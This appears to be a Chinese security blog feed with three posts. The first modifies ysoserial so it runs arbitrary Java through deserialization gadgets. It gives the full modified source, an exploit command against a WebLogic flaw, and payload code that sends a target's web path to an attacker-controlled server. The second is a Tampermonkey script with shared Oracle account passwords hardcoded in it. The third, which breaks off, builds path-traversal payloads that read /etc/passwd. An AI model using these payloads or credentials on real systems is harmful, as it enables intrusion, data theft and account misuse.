        <content type="html"><![CDATA[<p>修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。</p><a id="more"></a><h2 id="0x01-意义"><a href="#0x01-意义" class="headerlink" title="0x01 意义"></a>0x01 意义</h2><p><strong>一、绕过检测，执行某些禁止命令。</strong></p><p>有些系统做了防护，不许执行或者没有某些命令（比如wget）。这时可以编写命令同等功能的代码，来绕过限制。</p><p><strong>二、解决各个平台命令不一致。</strong></p><p>不同操作系统，命令会有不同。比如查看ip操作，Windows是ipconfig，Linux是ifconfg。而java代码是可以跨平台的。</p><p><strong>三、获取更高的自由度，实现更复杂的操作。</strong></p><p>命令的背后也是代码，当需要执行一些比较复杂的操作时，纯命令是很难实现的，但代码可以！</p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>在<code>ysoserial/payloads/util/Gadgets.java</code>中的代码注释，作者提到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections（待做，可以做一些有趣的事情比如注入一个纯java的反弹或绑定shell去绕过较弱的保护）</span><br></pre></td></tr></table></figure><p>可知作者也有此意，并给我们预留了可指定自定义代码的变量<code>cmd</code>。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/cmd-code.png" alt="作者的注释"></p><p>我们从控制台传入的命令，会被保存到<code>command</code>变量中，最后ysoserial会将该变量的值,拼接到<code>&quot;Runtime.getRuntime.exec(&quot; + 命令 + &quot;)&quot;</code>中，生成形成达到命令执行的代码，所以本质上还是代码执行。</p><p><strong>因此要想使ysoserial支持执行自定义代码，只要使得在控制台输入能控制cmd变量的值即可。实现起来并不难</strong></p><h2 id="0x03-编码"><a href="#0x03-编码" class="headerlink" title="0x03 编码"></a>0x03 编码</h2><p>根据我个人的的需要，给ysoserial加入以下三种方式来指定要执行的自定义代码。</p><table><thead><tr><th align="center">序号</th><th align="left">方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">“code:代码内容”</td><td align="left">代码量比较少时采用</td></tr><tr><td align="center">2</td><td align="left">“codebase64:代码内容base64编码”</td><td align="left">防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。</td></tr><tr><td align="center">3</td><td align="left">“codefile:代码文件路径”</td><td align="left">代码量比较多时采用</td></tr></tbody></table><p><strong>注意：如果没有指定以上开头，就默认当命令处理。</strong></p><p>基于上面的需求，我修改了<code>createTemplatesImpl()</code>函数的代码为如下，具体如何实现，请参考代码和注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Code by c0ny1</span></span><br><span class="line">    <span class="comment">// email: root@gv7.me</span></span><br><span class="line">    <span class="comment">// date: 2019-04-29</span></span><br><span class="line">    <span class="comment">// From: https://www.cnblogs.com/0201zcr/p/5009975.html</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    String cmd = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span>(command.startsWith(<span class="string">"code:"</span>)) &#123;</span><br><span class="line">        cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codebase64:"</span>))&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] decode = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(command.substring(<span class="number">11</span>));</span><br><span class="line">        cmd = <span class="keyword">new</span> String(decode);</span><br><span class="line">        cmd = <span class="keyword">new</span> URLDecoder().decode(cmd);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codefile:"</span>))&#123;</span><br><span class="line">        String codefile = command.substring(<span class="number">9</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(codefile);</span><br><span class="line">            <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">                FileReader reader = <span class="keyword">new</span> FileReader(file);</span><br><span class="line">                BufferedReader br = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</span><br><span class="line">                String line = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    sb.append(line);</span><br><span class="line">                    sb.append(<span class="string">"\r\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cmd = sb.toString();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.err.println(String.format(<span class="string">"[-] %s is not exists!"</span>,codefile));</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">            command.replaceAll(<span class="string">"\\\\"</span>, <span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">            <span class="string">"\");"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.err.println(<span class="string">"----------------------------------Java code start----------------------------------"</span>);</span><br><span class="line">    System.err.println(cmd);</span><br><span class="line">    System.err.println(<span class="string">"-----------------------------------Java code end-----------------------------------"</span>);</span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完代码后，我们重新将其打包为ysoserial-0.0.6.1-custom-code-exec.jar，就可以使用可指定自定义代码的ysoserial了。需要我编译好的jar，请公众号后台回复“ysoserial可执行自定义代码版本”获取。</p><p>注意:只有以下payload支持指定支持任意代码执行，其他paylaod需要手工修改其代码，因为它们没有调用我们修改的<code>Gadgets.createTemplatesImpl</code>方法。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/call.png" alt="调用了createTemplatesImpl方法的payload"></p><h2 id="0x04-案例"><a href="#0x04-案例" class="headerlink" title="0x04 案例"></a>0x04 案例</h2><p>下面举一个“不痛不痒”的例子，来展现其高自由度。</p><p>假设我们有个需求是这样的，获取目标系统的web物理路径，如果目标能访问我们服务器就把信息提交到服务器的web服务上。如果不能，就把信息写到目标自己的web目录下。如果你使用命令在实现，是比较费劲的，但是用代码就轻而易举！</p><p><strong>custiom-code.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">String HOST = <span class="string">"http://192.168.149.1:1665"</span>;</span><br><span class="line">String WEB_PATH = System.getProperty(<span class="string">"user.dir"</span>);</span><br><span class="line"></span><br><span class="line">String str_url = HOST + <span class="string">"/?info="</span> + WEB_PATH;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//若目标能访问我们的服务器，则发送信息到服务器上</span></span><br><span class="line">    java.net.URL url = <span class="keyword">new</span> java.net.URL(str_url);</span><br><span class="line">    java.net.URLConnection conn = url.openConnection();</span><br><span class="line">    conn.connect();</span><br><span class="line">    conn.getContent();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">//若目标不能访问我们的服务器，则将信息写到自己的web目录下info.log文件中</span></span><br><span class="line">    String webPath = WEB_PATH + <span class="string">"/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/info.log"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.FileOutputStream f1 = <span class="keyword">new</span> java.io.FileOutputStream(webPath);</span><br><span class="line">        f1.write(WEB_PATH.getBytes());</span><br><span class="line">        f1.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我利用CNVD-C-2019-48814这个漏洞，让远程服务器（192.168.149.142）加载我本机rmi服务（192.168.149.1:1664），我的rmi服务指定执行的代码，是我们编写好的custom-code.java。具体命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6.1-custom-code-exec.jar ysoserial.exploit.JRMPListener 1664 Jdk7u21 &quot;codefile:custom-code.java&quot;</span><br></pre></td></tr></table></figure><p>通过测试发现，在本机启动web服务（92.168.149.1:1665），且目标可访问时，可成功接收信息。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/server_info.png" alt="服务器成功接收到信息"></p><p>然后我把服务器web服务停止了，目标自然无法访问。结果在目标系统的web目录下成功生成了文件，保存着我们要采集的信息。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/txt_info.png" alt="目标web目录下成功生成包含信息的文件"></p><p>从任意命令执行变成任意代码执行，在我看来危害增大了不少。在命令执行getshell受阻时，如何通过代码执行突破呢，到这里懂的人自然懂了。</p><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul><li><a href="https://blog.csdn.net/fnmsd/article/details/79534877" target="_blank" rel="noopener">修改ysoserial使其支持生成代码执行Payload</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编写油猴脚本，实现自动登录下载Oracle产品</title>
      <link href="/articles/2019/oracle-download-auto-login-tampermonkey-script/"/>
      <url>/articles/2019/oracle-download-auto-login-tampermonkey-script/</url>
      
        <content type="html"><![CDATA[<p>研究Java漏洞的爱好者，不免要经常去Oracle官网下载各种版本的Java JDK，Weblogic等。我们都知道，Oracle相关产品是需要登录才能下载的。这就意味着你要注册个账号，并且每次下载都要登录，这很繁琐！空闲时简单写了个自动化油猴脚本，无需人工注册和登录即可下载。</p><h2 id="0x01-收集公开账号密码"><a href="#0x01-收集公开账号密码" class="headerlink" title="0x01 收集公开账号密码"></a>0x01 收集公开账号密码</h2><p>网上有很多大佬使用自己邮箱注册了Oracle的账号，并公开了密码，方便大家下载使用，在此感谢他们无私奉献。以下是我收集到的（可成功登录）：</p><blockquote><p><a href="mailto:1772885836@qq.com" target="_blank" rel="noopener">1772885836@qq.com</a><br>OracleTest1234</p><p><a href="mailto:541509124@qq.com" target="_blank" rel="noopener">541509124@qq.com</a><br>LR4ever.1314</p><p><a href="mailto:2696671285@qq.com" target="_blank" rel="noopener">2696671285@qq.com</a><br>Oracle123</p></blockquote><h2 id="0x02-编写油猴脚本"><a href="#0x02-编写油猴脚本" class="headerlink" title="0x02 编写油猴脚本"></a>0x02 编写油猴脚本</h2><p>油猴脚本的功能是在<code>https://login.oracle.com/mysso/signon.jsp</code>页面，自动完成以下操作。将我们上面收集到的账号密码，填写到Oracle单点登录页面的表单中，最后点击登录，完成下载。具体实现我在源码中已经注释得很清楚了。</p><p>我设置了一个变量<code>is_auto_login</code>，默认值为<code>true</code>，就是默认会自动输入账号密码并点击登录。如果你想让脚本只自动填写账号密码不自动点登录，请将其设置<code>false</code>！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Oracle download auto login</span></span><br><span class="line"><span class="comment">// @namespace    http://gv7.me</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  自动登录Oracle官网，方便下载Oracle的各种产品，比如:Java JDK,Weblogic等</span></span><br><span class="line"><span class="comment">// @author       c0ny1</span></span><br><span class="line"><span class="comment">// @match        https://login.oracle.com/mysso/signon.jsp</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否自动点击登录</span></span><br><span class="line">    <span class="keyword">var</span> is_auto_login = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取随机数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">lower, upper</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (upper - lower)) + lower;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过标签名，属性名和属性值来定位元素</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line">                <span class="keyword">return</span> target[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//存储账号密码</span></span><br><span class="line">    <span class="keyword">var</span> users = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">var</span> passs = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line">    users[<span class="number">0</span>] = <span class="string">"1772885836@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">0</span>] = <span class="string">"OracleTest1234"</span>;</span><br><span class="line">    users[<span class="number">1</span>] = <span class="string">"541509124@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">1</span>] = <span class="string">"LR4ever.1314"</span>;</span><br><span class="line">    users[<span class="number">2</span>] = <span class="string">"2696671285@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">2</span>] = <span class="string">"Oracle123"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//随机获取一个账号密码，并将其填入登录表单中</span></span><br><span class="line">    <span class="keyword">var</span> sso_username = <span class="built_in">document</span>.getElementById(<span class="string">"sso_username"</span>);</span><br><span class="line">    <span class="keyword">var</span> sso_password = <span class="built_in">document</span>.getElementById(<span class="string">"ssopassword"</span>);</span><br><span class="line">    <span class="keyword">var</span> i = random(<span class="number">0</span>,users.length - <span class="number">1</span>);</span><br><span class="line">    sso_username.value = users[i];</span><br><span class="line">    sso_password.value = passs[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否自动点击登录</span></span><br><span class="line">    <span class="keyword">if</span>(is_auto_login)&#123;</span><br><span class="line">        <span class="keyword">var</span> btn_login = getTargetByTAV(<span class="string">"input"</span>,<span class="string">"tabindex"</span>,<span class="number">3</span>);</span><br><span class="line">        btn_login.click();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="0x03-脚本效果演示"><a href="#0x03-脚本效果演示" class="headerlink" title="0x03 脚本效果演示"></a>0x03 脚本效果演示</h2><p><img src="/articles/2019/oracle-download-auto-login-tampermonkey-script/oracle-download-auto-login.gif" alt="效果演示"></p><p>脚本已经上传Greasy Fork，需要的自行安装。</p><p><a href="https://greasyfork.org/zh-CN/scripts/382627-oracle-download-auto-login" target="_blank" rel="noopener">https://greasyfork.org/zh-CN/scripts/382627-oracle-download-auto-login</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>编写Spring Cloud Config Server路径穿越漏洞全面检测脚本</title>
      <link href="/articles/2019/write-cve-2019-3799-batch-scan-script/"/>
      <url>/articles/2019/write-cve-2019-3799-batch-scan-script/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud Config Server路径穿越漏洞（CVE-2019-3799）的分析文章已经很多了，这里我不在画蛇填足。在分析该漏洞之后，发现了一些小细节，感觉对该漏洞检测还是挺有帮助的。基于发现的这些细节，我们来构造适应各种场景，甚至各种奇葩场景的批量检测脚本！</p><a id="more"></a><h2 id="0x01-简洁原理"><a href="#0x01-简洁原理" class="headerlink" title="0x01 简洁原理"></a>0x01 简洁原理</h2><p>Spring cloud config 分客户端和服务端。服务端供客户端查询配置，本次漏洞就是出在服务端。</p><p>当客户端提交的访问配置请求，会在服务端被解析为以下2种：</p><ul><li><a href="http://xxx:8888/{name}/{profile}/{label}/{path}" target="_blank" rel="noopener">http://xxx:8888/{name}/{profile}/{label}/{path}</a></li><li><a href="http://xxx:8888/{name}/{profile}/{path}" target="_blank" rel="noopener">http://xxx:8888/{name}/{profile}/{path}</a></li></ul><p>配置文件保存在服务端系统临时文件<code>{system_tmp_path}</code>下。在需要获取目标配置文件绝对路径时，服务端会将客户端提供的相对路径<code>{path}</code>和系统临时文件目录<code>{system_tmp_path}</code>进行拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config_file_path = &#123;system_tmp_path&#125; + &#123;path&#125;</span><br></pre></td></tr></table></figure><p>由于<code>{path}</code>客户端可控且未过滤<code>../</code>，从而导致目录穿越，可读服务端机器上任意文件！</p><h2 id="0x02-漏洞检测点"><a href="#0x02-漏洞检测点" class="headerlink" title="0x02 漏洞检测点"></a>0x02 漏洞检测点</h2><p>经过分析代码，可以发现，其实该漏洞有三个检查点。不过网上大多数文章提供的漏洞url只是第一处。</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/ResourceController_retrieve.png" alt="第一第二处"></p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/EnvironmentController_binary.png" alt="第三处"></p><p>我们先看看第一处<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**&quot;)</span><br></pre></td></tr></table></figure><p>这里<code>name</code>为应仓库名称,<code>profile</code>为应配置文件环境<code>label</code>为git分支名。实际测试中需要<code>label</code>为存在的分支名（一般git仓库都存在<code>master</code>分支），否则报错，<code>name</code>和<code>profile</code>可以为任意。由此我们可以构造如下url，即可匹配到该<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8888/aaa/bbb/master/&#123;payload&#125;</span><br></pre></td></tr></table></figure><p>我们接着来看第二处<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/&#123;name&#125;/&#123;profile&#125;/**&quot;, params = &quot;useDefaultLabel&quot;)</span><br></pre></td></tr></table></figure><p>根据Spring的RequestMapping匹配规则我们很容易构造以下url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com:8888/aaa/bbb/&#123;payload&#125;?useDefaultLabel=1</span><br></pre></td></tr></table></figure><p>实际上我们构造的url虽然会被该<code>@RequestMapping</code>匹配到，但并不会执行该注解处代码。而是执行了以下注解处代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org/springframework/cloud/config/server/environment/EnvironmentController.java</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profiles&#125;/&#123;label:.*&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Environment <span class="title">labelled</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是因为我们构造的url，都符合两处注解的匹配规则，但后者匹配度更好优先级更高（<code>*</code>优先级大于<code>**</code>），自然优先被框架用于处理请求了。</p><p>因此我们可以构造以下链接，让第一个注解匹配度最高，使得程序使用存在漏洞的方法来处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com:8888/aaa/bbb/ccc/&#123;payload&#125;?useDefaultLabel=1</span><br></pre></td></tr></table></figure><p>第三处，和第一处构造的url一样的，需要在数据包Accept头加入<code>application/octet-stream</code>即可触发！</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/poc_3.png" alt></p><h2 id="0x03-目标操作系统"><a href="#0x03-目标操作系统" class="headerlink" title="0x03 目标操作系统"></a>0x03 目标操作系统</h2><p>在黑盒渗透测试时，无法确定目标系统是Windows还是Linux，故最稳妥的方法是构造适合两者的payload，都检测一篇。</p><ul><li>Linux下读<code>/etc/passwd</code>，检查关键字为<code>root:</code></li><li>Window下读<code>c:/Windows/win.ini</code>,检查关键字为<code>[extensions]</code></li></ul><p>注意： <strong>在Windows下该漏洞无法跨盘符读文件，也就是只能读和系统临时文件夹同盘符的任意路径下任意文件。</strong> 所以在Windwos系统下，系统临时文件路径被修改（这种情况比较少），即使目标存在漏洞，我们的payload也无法检测的，目前暂时没有好的解决方案。</p><h2 id="0x04-25F的个数"><a href="#0x04-25F的个数" class="headerlink" title="0x04 ..%25F的个数"></a>0x04 ..%25F的个数</h2><p><code>..%252F</code>是<code>../</code>的两次URL编码后结果，它是路径穿越的关键，其个数取决于系统临时文件目录的深度。</p><h4 id="3-1-默认情况"><a href="#3-1-默认情况" class="headerlink" title="3.1 默认情况"></a>3.1 默认情况</h4><p>这里的默认情况是指，服务端系统临时目录采用的是默认路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows系统临时文件存储路径：</span><br><span class="line">file:/C:/Users/ADMINI~1/AppData/Local/Temp/</span><br><span class="line">Windows下Spring cloud config server存储配置路径：</span><br><span class="line">file:/C:/Users/ADMINI~1/AppData/Local/Temp/config-repo-&lt;randomid&gt;/</span><br><span class="line">Linux系统临时文件存储路径：</span><br><span class="line">/tmp/</span><br><span class="line">Linux下Spring cloud config server存储配置路径：</span><br><span class="line">/tmp/config-repo-&lt;randomid&gt;/</span><br></pre></td></tr></table></figure><p>所以要吃掉所有配置路径，Windwos下第一处漏洞检测需要6个<code>..%252F</code>,第二处需要7个，第三处需要6个。Linux下第一处2个，第二处需要3个，第三处需要6个。</p><h4 id="3-2-极端情况"><a href="#3-2-极端情况" class="headerlink" title="3.2 极端情况"></a>3.2 极端情况</h4><p>这里的极端情况是指，服务端系统临时目录被管理员自定义为其他路径，路径深度未知。这时我们可以估计一个最大深度50（相信不会有管理员奇葩到设置更深的目录了）</p><p>综合以上各个方面的分析，我们就可以构造出如下8个POC来检查，以应对各种情况该漏洞的检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*2 + etc%252Fpasswd</span><br><span class="line">http://xxx:8888/a/b/master/ + 